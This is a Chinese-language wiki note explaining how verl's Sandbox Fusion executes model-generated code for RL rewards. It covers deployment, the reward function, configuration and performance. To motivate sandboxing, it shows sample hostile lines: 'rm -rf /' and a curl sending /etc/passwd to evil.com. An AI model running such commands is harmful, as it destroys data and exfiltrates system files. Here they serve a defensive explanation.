---
brief: "verl Sandbox Fusion 沙箱——代码执行类任务的安全沙箱集成；在 RLVR 代码生成任务中安全执行模型输出的代码并返回 pass/fail 奖励；隔离环境配置和超时处理的工程实践。"
title: "Sandbox Fusion 沙箱"
type: concept
domain: ai/llm/frameworks/verl
created: "2026-02-13"
updated: "2026-02-13"
tags:
  - ai/llm/frameworks/verl
  - type/concept
---
# Sandbox Fusion 沙箱

> 参考：https://verl.readthedocs.io/en/latest/examples/sandbox_fusion_example.html

## 什么是 Sandbox Fusion

Sandbox Fusion 是一个代码执行沙箱，专门用于 RL 训练中的 **代码验证 reward**。当你训练模型写代码（比如数学推理生成 Python 解题代码），需要实际运行代码来判断答案是否正确。

简单说：**模型生成代码 → 沙箱执行 → 对比预期输出 → 计算 reward**。

## 为什么需要沙箱

直接在训练机上 `exec()` 模型生成的代码？太危险了：

```python
# 模型可能生成这种东西
import os; os.system("rm -rf /")
import subprocess; subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
while True: pass  # 无限循环吃 CPU
```

沙箱提供：
- **隔离**：容器级别隔离，出了容器什么都碰不到
- **超时**：默认 30s 超时，防止死循环
- **资源限制**：限制内存、CPU、网络

## 架构

```
verl Trainer
    │
    ▼ (HTTP API)
┌────────────────────────┐
│   Sandbox Fusion Server│
│  ┌──────────────────┐  │
│  │ Request Queue    │  │
│  ├──────────────────┤  │
│  │ Worker Pool      │  │
│  │ ┌────┐ ┌────┐   │  │
│  │ │ 🐳 │ │ 🐳 │   │  │  ← Docker 容器
│  │ └────┘ └────┘   │  │
│  └──────────────────┘  │
└────────────────────────┘
```

## 部署与使用

### 1. 部署 Sandbox Fusion

```bash
# 拉取镜像
docker pull sandboxfusion/sandbox-server:latest

# 启动
docker run -d \
  --name sandbox-fusion \
  -p 8080:8080 \
  -v /var/run/docker.sock:/var/run/docker.sock \
  sandboxfusion/sandbox-server:latest
```

### 2. 在 verl reward function 中调用

```python
import requests

def code_execution_reward(data_batch):
    """通过 Sandbox Fusion 验证代码正确性"""
    rewards = []
    
    for prompt, response, ground_truth in zip(
        data_batch["prompts"],
        data_batch["responses"],
        data_batch["ground_truths"]
    ):
        # 从 response 中提取代码块
        code = extract_code_block(response)
        
        if code is None:
            rewards.append(-1.0)  # 没有代码块，负 reward
            continue
        
        # 调用沙箱执行
        result = requests.post(
            "http://sandbox-fusion:8080/execute",
            json={
                "code": code,
                "language": "python",
                "timeout": 30,
                "memory_limit_mb": 256,
            }
        )
        
        output = result.json()
        
        if output["status"] == "success":
            # 对比输出和答案
            if output["stdout"].strip() == ground_truth.strip():
                rewards.append(1.0)
            else:
                rewards.append(-0.5)  # 能跑但答案错
        elif output["status"] == "timeout":
            rewards.append(-0.8)  # 超时
        else:
            rewards.append(-1.0)  # 运行出错
    
    return torch.tensor(rewards)
```

### 3. verl 配置集成

```yaml
reward:
  type: "custom"
  custom_fn: "my_rewards.code_execution_reward"
  sandbox:
    endpoint: "http://sandbox-fusion:8080"
    timeout: 30
    max_concurrent: 32  # 并发执行数
    retry: 2
```

## 性能考虑

沙箱执行是 RL 训练的**瓶颈之一**，因为每个 rollout 的每个 response 都要跑一次：

```python
# 假设:
# - batch_size = 32
# - group_size = 8 (GRPO)
# - 每次沙箱调用 2s
# 
# 串行: 32 × 8 × 2s = 512s = 8.5 分钟！
# 并行 (32 workers): 32 × 8 × 2s / 32 = 16s ← 可以接受
```

**关键优化**：
1. **并行 worker 数量**：至少等于 `batch_size × group_size`
2. **预热容器**：第一次执行会创建容器，后续复用
3. **快速失败**：语法错误不用等超时，解析阶段就返回
4. **缓存结果**：相同代码的结果可以缓存（但 RL 训练中重复概率低）

## 支持的语言

| 语言 | 适用场景 |
|------|---------|
| Python | 数学推理、算法题 |
| JavaScript | 前端代码验证 |
| Bash | 系统操作题 |
| SQL | 数据库查询验证（需额外数据库容器） |

## 替代方案

如果不想部署 Sandbox Fusion，也有轻量方案：

```python
import multiprocessing
import signal

def safe_exec(code, timeout=10):
    """极简沙箱：子进程 + 超时"""
    def _run(code, result_queue):
        try:
            local_ns = {}
            exec(code, {"__builtins__": {}}, local_ns)
            result_queue.put(("success", str(local_ns.get("answer", ""))))
        except Exception as e:
            result_queue.put(("error", str(e)))
    
    q = multiprocessing.Queue()
    p = multiprocessing.Process(target=_run, args=(code, q))
    p.start()
    p.join(timeout)
    
    if p.is_alive():
        p.terminate()
        return "timeout", ""
    
    return q.get() if not q.empty() else ("error", "no output")
```

⚠️ 这个方案**安全性远不如 Docker 沙箱**，仅适合可信环境。

## 相关

- [[AI/LLM/Frameworks/verl/verl 概述|verl 概述]]
- [[AI/LLM/Frameworks/verl/Reward Function|Reward Function]]
- [[AI/LLM/Frameworks/verl/Post-Training 数据准备|Post-Training 数据准备]]
- [[AI/LLM/Frameworks/verl/多轮 RL 训练交互|多轮 RL 训练交互]]
